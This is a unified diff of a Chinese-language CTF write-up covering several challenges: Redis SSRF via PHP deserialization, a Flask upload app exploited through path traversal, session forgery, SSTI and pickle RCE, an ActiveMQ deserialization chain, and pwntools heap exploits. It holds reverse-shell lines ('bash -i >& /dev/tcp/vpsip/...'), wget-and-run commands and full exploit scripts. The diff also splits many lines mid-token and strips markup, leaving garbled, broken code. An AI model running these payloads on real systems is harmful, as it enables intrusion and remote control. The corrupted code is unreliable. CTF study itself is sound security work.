@@ -54,13 +54,31 @@ $a->start2 = "o.0";
 $a->start = ["POC"=>"0.o"];
 $a->start1->cl = new Er;
 $payload0 = "dict";
-$payload1 = "dict://127.0.0.1:6379/config:set:dir:/tmp";
-$payload2 = "dict://127.0.0.1:6379/config:set:dbfilename:exp.so";
-$payload3 = "dict://127.0.0.1:6379/slaveof:ip:port";
-$payload4 = "dict://127.0.0.1:6379/module:load:/tmp/exp.so";
-$payload5 = "dict://127.0.0.1:6379/slave:no:one";
-$payload6 = "dict://127.0.0.1:6379/system.exec:env";
-$payload7 = "dict://127.0.0.1:6379/module:unload:system";
+$payload1 = "dict://127.0.0.1:
+6379/config:
+set:
+dir:/tmp";
+$payload2 = "dict://127.0.0.1:
+6379/config:
+set:
+dbfilename:
+exp.so";
+$payload3 = "dict://127.0.0.1:
+6379/slaveof:ip:
+port";
+$payload4 = "dict://127.0.0.1:
+6379/module:
+load:/tmp/exp.so";
+$payload5 = "dict://127.0.0.1:
+6379/slave:no:
+one";
+$payload6 = "dict://127.0.0.1:
+6379/system.exec:
+env";
+$payload7 = "dict://127.0.0.1:
+6379/module:
+unload:
+system";
 $c = base64_encode($payload1);
 $a->start1->cl->Flag = $c;
 echo serialize($a);
@@ -70,7 +88,8 @@ echo serialize($a);
 
 python3 redis-rogue-server.py --server-only
 
-payload3的ip:port替换为自己vps的ip和port，依次POST打入反序列化产生的payload1，2，3，4，5，6，7即可拿到flag。
+payload3的ip:
+port替换为自己vps的ip和port，依次POST打入反序列化产生的payload1，2，3，4，5，6，7即可拿到flag。
 
 picup
 
@@ -90,21 +109,22 @@ picup
     <meta charset="UTF-8">
     <title>Register</title>
 </head>
-<body>
+
     <h1>Register</h1>
     <form action="register.php" method="post">
-        <div>
+        
             <label for="username">用户名:</label>
-            <input type="text" id="username" name="username" required>
-        </div>
-        <div>
+            
+        
+        
             <label for="username">密&emsp;码:</label>
-            <input type="password" id="password" name="password" required>
-        </div>
-        <button type="submit">注册</button>
+            
+        
+        注册
     </form>
-<!-- You can only register 2 users,otherwise all registered users(except admin) will be cleared to register new ones. -->
-</body>
+<!-- You can only register 2 users,otherwise all registered users(
+except admin) will be cleared to register new ones. -->
+
 </html>
 
 在/login.php路由尝试弱密码爆破或SQL注入登录admin用户未果后，不妨在/register.php路由注册一个用户：
@@ -125,19 +145,19 @@ Login success! <a href='/'>Click here to redirect.</a>
     <meta charset="UTF-8">
     <title>Picup</title>
 </head>
-<body>
+
     <h1>Pic Upload</h1>
     <form action="/" method="post" enctype="multipart/form-data">
-        <div>
+        
             <label for="file">文件：</label>
-            <input type="file" name="file" id="file">
-        </div>
-        <button type="submit">上传</button>
+            
+        
+        上传
     </form>
     <code>Please upload a valid file!</code>
     <!-- The web administrator clears all uploaded files every 10 minutes -->
     <!-- You can only upload 4 files,otherwise all uploaded files will be cleared to upload new ones. -->
-</body>
+
 </html>
 
 随便上传个文件尝试：
@@ -150,13 +170,15 @@ File upload success! Path: <a href='pic.php?pic=TenMap1e.txt'>./uploads/Ten
 
 响应包源代码：
 
-<h1>files in ./uploads/</h1><br><a href='pic.php?pic=TenMap1e.txt'>./uploads/TenMap1e.txt</a><br>
+<h1>files in ./uploads/</h1>
+<a href='pic.php?pic=TenMap1e.txt'>./uploads/TenMap1e.txt</a>
+
 
 似乎会遍历显示./uploads路径目录下的所有文件并且存在以GET传参pic参数为文件名的文件读取点，点击链接传参?pic=TenMap1e.txt尝试：
 
 是一张损坏的图片，响应包源代码：
 
-<img src="data:image/png;base64,VGVuTWFwMWU=">
+
 
 易发现实际上就是base64编码的文件内容。经过对任意文件读取的常见过滤绕过尝试可以发现此处对于pic参数的过滤是将../替换为空，可以使用..././的姿势进行绕过，payload：
 
@@ -164,30 +186,54 @@ File upload success! Path: <a href='pic.php?pic=TenMap1e.txt'>./uploads/Ten
 
 传参可得：
 
-<img src="data:image/png;base64,cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KZ25hdHM6eDo0MTo0MTpHbmF0cyBCdWctUmVwb3J0aW5nIFN5c3RlbSAoYWRtaW4pOi92YXIvbGliL2duYXRzOi91c3Ivc2Jpbi9ub2xvZ2luCm5vYm9keTp4OjY1NTM0OjY1NTM0Om5vYm9keTovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwMDo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCmN0Zjp4Ojk5OTo5OTk6Oi9ob21lL2N0ZjovYmluL3NoCg==">
+
 
 base64解码即可读取得到/etc/passwd文件的内容：
 
-root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-bin:x:2:2:bin:/bin:/usr/sbin/nologin
-sys:x:3:3:sys:/dev:/usr/sbin/nologin
-sync:x:4:65534:sync:/bin:/bin/sync
-games:x:5:60:games:/usr/games:/usr/sbin/nologin
-man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+root:x:0:0:
+root:/root:/bin/bash
+daemon:x:1:1:
+daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:
+bin:/bin:/usr/sbin/nologin
+sys:x:3:3:
+sys:/dev:/usr/sbin/nologin
+sync:x:4:
+65534:
+sync:/bin:/bin/sync
+games:x:5:60:
+games:/usr/games:/usr/sbin/nologin
+man:x:6:12:
+man:/var/cache/man:/usr/sbin/nologin
 lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
-mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
-news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
-uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
-proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
-www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
-list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
-irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
-gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
-nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
-_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
-ctf:x:999:999::/home/ctf:/bin/sh
+mail:x:8:8:
+mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:
+news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:
+uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:
+proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:
+www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:
+backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:
+Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:
+ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:
+Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:
+65534:
+65534:
+nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:
+100:
+65534::/nonexistent:/usr/sbin/nologin
+ctf:x:
+999:
+999::/home/ctf:/bin/sh
 
 同理尝试读取/app目录下的Web源码：
 
@@ -248,10 +294,12 @@ def pic():
         if session.get('username')=="admin":
             return pickle.load(open(filepath,"rb"))
         else:
-            return '''<img src="data:image/png;base64,'''+base64.b64encode(open(filepath,"rb").read()).decode()+'''">'''
-    res="<h1>files in ./uploads/</h1><br>"
+            return ''''''
+    res="<h1>files in ./uploads/</h1>
+"
     for f in os.listdir("./uploads"):
-        res+="<a href='pic.php?pic="+f+"'>./uploads/"+f+"</a><br>"
+        res+="<a href='pic.php?pic="+f+"'>./uploads/"+f+"</a>
+"
     return res
 
 if __name__ == '__main__':
@@ -313,7 +361,7 @@ if (pic:=request.args.get('pic')) and os.path.isfile(filepath:="./uploads/"+p
  if session.get('username')=="admin":
   return pickle.load(open(filepath,"rb"))
     else:
-  return '''<img src="data:image/png;base64,'''+base64.b64encode(open(filepath,"rb").read()).decode()+'''">'''
+  return ''''''
 
 使用flask_session_cookie_manager脚本（https://github.com/noraj/flask-session-cookie-manager）伪造session：
 
@@ -840,11 +888,6 @@ https://www.ichunqiu.com/competition
     this.foodService = foodServiceClass.getDeclaredConstructor(new Class[] { String.class }).newInstance(new Object[] { name });
     return "Changed to " + foodServiceClassName + " with name " + name;
   }
-```
-
-
-
-```
 public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
     String uri = ((HttpServletRequest)request).getRequestURI().replaceAll("/api", "");
     String endpoint = uri.replaceAll("/", "");
@@ -854,11 +897,6 @@ public void doFilter(ServletRequest request, ServletResponse response, Fil
     } 
     chain.doFilter(request, response);
   }
-```
-
-
-
-```
 ActiveMQConnectionFactory connectionFactory = new ActiveMQConnectionFactory(args[0]);
 connectionFactory.setTrustedPackages(List.of(new String[]{"com.example.customer.entity"}));
 Connection connection = connectionFactory.createConnection();
@@ -886,13 +924,8 @@ consumer.setMessageListener(message -> {
     }
 });
 System.out.println("Waiting for messages...");
-```
 
-
-
-```
-<beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
-  <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
+  
     <constructor-arg>
       <list>
         <value>bash</value>
@@ -900,20 +933,11 @@ System.out.println("Waiting for messages...");
         <value><![CDATA[bash -i >& /dev/tcp/vpsip/2333 0>&1]]></value>
       </list>
     </constructor-arg>
-  </bean>
-</beans>
-```
+  
 
-
-
-```
-wget http://vpsip:8089/ExploitBroker.class && 
+wget http://vpsip:
+8089/ExploitBroker.class && 
 java ExploitBroker
-```
-
-
-
-```
 import java.io.DataOutputStream;
 import java.io.IOException;
 import java.io.OutputStream;
@@ -936,7 +960,8 @@ public class ExploitBroker {
         dos.writeBoolean(true);
         dos.writeUTF("org.springframework.context.support.ClassPathXmlApplicationContext");
         dos.writeBoolean(true);
-        dos.writeUTF("http://vpsip:8089/broker.xml");
+        dos.writeUTF("http://vpsip:
+8089/broker.xml");
 
         dos.close();
         os.close();
@@ -944,93 +969,18 @@ public class ExploitBroker {
         
     }
 }
-```
-
-
-
-```
 <?xml version="1.0" encoding="UTF-8"?>
-<beans xmlns="http://www.springframework.org/schema/beans"
-       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
-       xmlns:context="http://www.springframework.org/schema/context"
-       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-4.0.xsd
-            http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-4.0.xsd">
-
-    <context:property-placeholder ignore-resource-not-found="false" ignore-unresolvable="false"/>
-
-    <bean class="java.lang.String">
-        <property name="String" value="#{T(javax.script.ScriptEngineManager).newInstance().getEngineByName('js').eval(&quot;
-function getunsafe() {
- var unsafe = java.lang.Class.forName('sun.misc.Unsafe')
-  .getDeclaredField('theUnsafe');
- unsafe.setAccessible(true);
- return unsafe.get(null);
-}
-var unsafe = getunsafe();
-brokerRegistry = org.apache.activemq.broker.BrokerRegistry.getInstance();
-brokers = brokerRegistry.getBrokers();
-for (key in brokers) {
- brokerService = brokers.get(key);
- try {
-  f = brokerService.getClass()
-   .getDeclaredField('shutdownHook');
- } catch (e) {
-  f = brokerService.getClass()
-   .getSuperclass()
-   .getDeclaredField('shutdownHook');
- }
- f.setAccessible(true);
- shutdownHook = f.get(brokerService);
- threadGroup = shutdownHook.getThreadGroup();
- f = threadGroup.getClass()
-  .getDeclaredField('threads');
- threads = unsafe.getObject(threadGroup, unsafe.objectFieldOffset(f));
- for (key in threads) {
-  thread = threads[key];
-  if (thread == null) {
-   continue;
-  }
-  threadName = thread.getName();
-  if (threadName.startsWith('ActiveMQ Transport: ')) {
-   f = thread.getClass()
-    .getDeclaredField('target');
-   tcpTransport = unsafe.getObject(thread, unsafe.objectFieldOffset(f));
-   f = tcpTransport.getClass()
-    .getDeclaredField('socket');
-   f.setAccessible(true);
-   socket = f.get(tcpTransport);
-   bos = new java.io.ByteArrayOutputStream();
-   dataOutput = new java.io.DataOutputStream(bos);
-   dataOutput.writeInt(1);
-   dataOutput.writeByte(31);
-   bs = new org.apache.activemq.openwire.BooleanStream();
-   bs.writeBoolean(true);
-   bs.writeBoolean(true);
-   bs.writeBoolean(true);
-   bs.writeBoolean(false);
-   bs.writeBoolean(true);
-   bs.writeBoolean(false);
-   bs.marshal(dataOutput);
-   dataOutput.writeUTF('bb');
-   dataOutput.writeUTF('aa');
-   dataOutput.writeUTF('org.springframework.context.support.ClassPathXmlApplicationContext');
-   dataOutput.writeUTF('http://vpsip:8089/rootshell.xml');
-   dataOutput.writeShort(0);
-   socketOutputStream = socket.getOutputStream();
-   socketOutputStream.write(bos.toByteArray());
-  }
- }
-}
-        &quot;)}"/>
-    </bean>
-</beans>
-```
 
 
+    <context:
+property-placeholder ignore-resource-not-found="false" ignore-unresolvable="false"/>
 
-```
-<beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
-  <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
+    
+        
+    
+
+
+  
     <constructor-arg>
       <list>
         <value>bash</value>
@@ -1038,13 +988,8 @@ for (key in brokers) {
         <value><![CDATA[bash -i >& /dev/tcp/vpsip/2334 0>&1]]></value>
       </list>
     </constructor-arg>
-  </bean>
-</beans>
-```
+  
 
-
-
-```
 <?php
 highlight_file(__file__);
 
@@ -1080,148 +1025,133 @@ $a->start2 = "o.0";
 $a->start = ["POC"=>"0.o"];
 $a->start1->cl = new Er;
 $payload0 = "dict";
-$payload1 = "dict://127.0.0.1:6379/config:set:dir:/tmp";
-$payload2 = "dict://127.0.0.1:6379/config:set:dbfilename:exp.so";
-$payload3 = "dict://127.0.0.1:6379/slaveof:ip:port";
-$payload4 = "dict://127.0.0.1:6379/module:load:/tmp/exp.so";
-$payload5 = "dict://127.0.0.1:6379/slave:no:one";
-$payload6 = "dict://127.0.0.1:6379/system.exec:env";
-$payload7 = "dict://127.0.0.1:6379/module:unload:system";
+$payload1 = "dict://127.0.0.1:
+6379/config:
+set:
+dir:/tmp";
+$payload2 = "dict://127.0.0.1:
+6379/config:
+set:
+dbfilename:
+exp.so";
+$payload3 = "dict://127.0.0.1:
+6379/slaveof:ip:
+port";
+$payload4 = "dict://127.0.0.1:
+6379/module:
+load:/tmp/exp.so";
+$payload5 = "dict://127.0.0.1:
+6379/slave:no:
+one";
+$payload6 = "dict://127.0.0.1:
+6379/system.exec:
+env";
+$payload7 = "dict://127.0.0.1:
+6379/module:
+unload:
+system";
 $c = base64_encode($payload1);
 $a->start1->cl->Flag = $c;
 echo serialize($a);
 ?>
-```
-
-
-
-```
 python3 redis-rogue-server.py --server-only
-```
-
-
-
-```
 <!DOCTYPE html>
 <html>
 <head>
     <meta charset="UTF-8">
     <title>Register</title>
 </head>
-<body>
+
     <h1>Register</h1>
     <form action="register.php" method="post">
-        <div>
+        
             <label for="username">用户名:</label>
-            <input type="text" id="username" name="username" required>
-        </div>
-        <div>
+            
+        
+        
             <label for="username">密&emsp;码:</label>
-            <input type="password" id="password" name="password" required>
-        </div>
-        <button type="submit">注册</button>
+            
+        
+        注册
     </form>
-<!-- You can only register 2 users,otherwise all registered users(except admin) will be cleared to register new ones. -->
-</body>
+<!-- You can only register 2 users,otherwise all registered users(
+except admin) will be cleared to register new ones. -->
+
 </html>
-```
-
-
-
-```
 Login success! <a href='/'>Click here to redirect.</a>
-```
-
-
-
-```
 <!DOCTYPE html>
 <html>
 <head>
     <meta charset="UTF-8">
     <title>Picup</title>
 </head>
-<body>
+
     <h1>Pic Upload</h1>
     <form action="/" method="post" enctype="multipart/form-data">
-        <div>
+        
             <label for="file">文件：</label>
-            <input type="file" name="file" id="file">
-        </div>
-        <button type="submit">上传</button>
+            
+        
+        上传
     </form>
     <code>Please upload a valid file!</code>
     <!-- The web administrator clears all uploaded files every 10 minutes -->
     <!-- You can only upload 4 files,otherwise all uploaded files will be cleared to upload new ones. -->
-</body>
+
 </html>
-```
-
-
-
-```
 File upload success! Path: <a href='pic.php?pic=TenMap1e.txt'>./uploads/TenMap1e.txt</a>.
-```
+<h1>files in ./uploads/</h1>
+<a href='pic.php?pic=TenMap1e.txt'>./uploads/TenMap1e.txt</a>
 
 
-
-```
-<h1>files in ./uploads/</h1><br><a href='pic.php?pic=TenMap1e.txt'>./uploads/TenMap1e.txt</a><br>
-```
-
-
-
-```
-<img src="data:image/png;base64,VGVuTWFwMWU=">
-```
-
-
-
-```
 ?pic=..././..././etc/passwd
-```
 
-
-
-```
-<img src="data:image/png;base64,cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KZ25hdHM6eDo0MTo0MTpHbmF0cyBCdWctUmVwb3J0aW5nIFN5c3RlbSAoYWRtaW4pOi92YXIvbGliL2duYXRzOi91c3Ivc2Jpbi9ub2xvZ2luCm5vYm9keTp4OjY1NTM0OjY1NTM0Om5vYm9keTovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwMDo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCmN0Zjp4Ojk5OTo5OTk6Oi9ob21lL2N0ZjovYmluL3NoCg==">
-```
-
-
-
-```
-root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-bin:x:2:2:bin:/bin:/usr/sbin/nologin
-sys:x:3:3:sys:/dev:/usr/sbin/nologin
-sync:x:4:65534:sync:/bin:/bin/sync
-games:x:5:60:games:/usr/games:/usr/sbin/nologin
-man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+root:x:0:0:
+root:/root:/bin/bash
+daemon:x:1:1:
+daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:
+bin:/bin:/usr/sbin/nologin
+sys:x:3:3:
+sys:/dev:/usr/sbin/nologin
+sync:x:4:
+65534:
+sync:/bin:/bin/sync
+games:x:5:60:
+games:/usr/games:/usr/sbin/nologin
+man:x:6:12:
+man:/var/cache/man:/usr/sbin/nologin
 lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
-mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
-news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
-uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
-proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
-www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
-list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
-irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
-gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
-nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
-_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
-ctf:x:999:999::/home/ctf:/bin/sh
-```
-
-
-
-```
+mail:x:8:8:
+mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:
+news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:
+uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:
+proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:
+www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:
+backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:
+Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:
+ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:
+Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:
+65534:
+65534:
+nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:
+100:
+65534::/nonexistent:/usr/sbin/nologin
+ctf:x:
+999:
+999::/home/ctf:/bin/sh
 ?pic=..././..././app/app.py
-```
-
-
-
-```
-#app.py
+    #app.py
 import os
 import pickle
 import base64
@@ -1274,19 +1204,16 @@ def pic():
         if session.get('username')=="admin":
             return pickle.load(open(filepath,"rb"))
         else:
-            return '''<img src="data:image/png;base64,'''+base64.b64encode(open(filepath,"rb").read()).decode()+'''">'''
-    res="<h1>files in ./uploads/</h1><br>"
+            return ''''''
+    res="<h1>files in ./uploads/</h1>
+"
     for f in os.listdir("./uploads"):
-        res+="<a href='pic.php?pic="+f+"'>./uploads/"+f+"</a><br>"
+        res+="<a href='pic.php?pic="+f+"'>./uploads/"+f+"</a>
+"
     return res
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=80)
-```
-
-
-
-```
 #Users.py
 import hashlib
 
@@ -1307,12 +1234,7 @@ class Users:
         if username in self.passwords and self.passwords[username]==hashlib.md5(password.encode()).hexdigest():
             return True
         return False
-```
-
-
-
-```
-#waf.py
+    #waf.py
 import os
 from werkzeug.utils import secure_filename
 
@@ -1330,57 +1252,17 @@ def waf(file):
 
     file.seek(0)
     return secure_filename(file.filename)
-```
-
-
-
-```
 return "Register successs! Your username is {username} with hash: {{users.passwords[{username}]}}.".format(username=username).format(users=users)
-```
-
-
-
-```
 app.secret_key=users.passwords['admin']=hashlib.md5(os.urandom(32)).hexdigest()
-```
-
-
-
-```
 if (pic:=request.args.get('pic')) and os.path.isfile(filepath:="./uploads/"+pic.replace("../","")):
  if session.get('username')=="admin":
   return pickle.load(open(filepath,"rb"))
     else:
-  return '''<img src="data:image/png;base64,'''+base64.b64encode(open(filepath,"rb").read()).decode()+'''">'''
-```
-
-
-
-```
+  return ''''''
 python flask_session_cookie_manager3.py encode -s "5fa7397bae81174237f01f64c165299c" -t "{'username':'admin'}"
-```
-
-
-
-```
 eyJ1c2VybmFtZSI6ImFkbWluIn0.ZYkoxw.oJOwM9sfFQlcG85g4BTN1d1lgfA
-```
-
-
-
-```
 app.template_folder="./"
-```
-
-
-
-```
 {{lipsum['__glob''als__']['__built''ins__']['ev''al'](request.data)}}
-```
-
-
-
-```
 import pickle
 from flask import render_template
 
@@ -1391,28 +1273,13 @@ class EXP():
 exp=EXP()
 f=open("exp","wb")
 pickle.dump(exp,f)
-```
-
-
-
-```
 GET /pic.php?pic=exp HTTP/1.1
 Host: localhost
 Cookie: session=eyJ1c2VybmFtZSI6ImFkbWluIn0.ZYkoxw.oJOwM9sfFQlcG85g4BTN1d1lgfA
 Content-Length: 39
 
 __import__('os').popen('whoami').read()
-```
-
-
-
-```
 cat /flag > flag
-```
-
-
-
-```
 from pwn import *
 context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])
 
@@ -1459,25 +1326,15 @@ payload=p64(canary)+p64(0)+p64(ret)+p64(pop_rdi)
 modify(-1,payload,str_sh,p64(sys_addr))
 choice(1)
 io.interactive()
-```
-
-
-
-```
 _wide_data设置为可控堆地址A，即满足*(fp + 0xa0) = A
  _wide_data->_IO_write_base设置为0，即满足*(A + 0x18) = 0
  _wide_data->_IO_buf_base设置为0，即满足*(A + 0x30) = 0
  _wide_data->_wide_vtable设置为可控堆地址B，即满足*(A + 0xe0) = B
  _wide_data->_wide_vtable->doallocate设置为地址C用于劫持RIP，即满足*(B + 0x68) = C
-```
-
-
-
-```
 # coding=utf-8
 from pwn import *
 p=process('./pwn')
-#p=remote("0.0.0.0",10003)
+    #p=remote("0.0.0.0",10003)
 elf = ELF('./pwn')
 libc = ELF('./libc.so.6')
 context(arch='amd64', os='linux', log_level='debug')
@@ -1488,10 +1345,14 @@ sla     = lambda delim,data         :p.sendlineafter(delim, dat
 r       = lambda num=4096           :p.recv(num)
 ru      = lambda delims      :p.recvuntil(delims)
 itr     = lambda                    :p.interactive()
-uu32    = lambda data               :u32(data.ljust(4,' '))
-uu64    = lambda data               :u64(data.ljust(8,' '))
-leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
-lg      = lambda address,data       :log.success('%s: '%(address)+hex(data))
+uu32    = lambda data               :
+u32(data.ljust(4,' '))
+uu64    = lambda data               :
+u64(data.ljust(8,' '))
+leak    = lambda name,addr          :
+log.success('{} = {:#x}'.format(name, addr))
+lg      = lambda address,data       :
+log.success('%s: '%(address)+hex(data))
 def dbg():
         gdb.attach(p)
 
@@ -1559,11 +1420,6 @@ itr()
 '''
 exit==>__run_exit_handlers==>_IO_cleanup==>_IO_flush_all_lockp==>_IO_wfile_overflow==>_IO_wdoallocbuf
 '''
-```
-
-
-
-```
 void draw() {
     char buf[0x100];
     if(magic || !dev || !name) {
@@ -1582,11 +1438,6 @@ void draw() {
     fread(0x114514000+addr, 1, 1, dev);
     magic = 1;
 }
-```
-
-
-
-```
 int init() {
     size_t tmp1 = stdin;
     setbuf(tmp1, 0);
@@ -1609,11 +1460,6 @@ switch (choice){
         printf("invalid option %ld.n", choice);
         break;
 }
-```
-
-
-
-```
 from pwn import *
 import time
 # context.arch = "amd64"
@@ -1767,11 +1613,6 @@ if __name__ == "__main__":
     print(code)
     tmp = disasm(code)
     print(tmp)
-```
-
-
-
-```
 from pwn import *
 from House_of_some import HouseOfSome
 
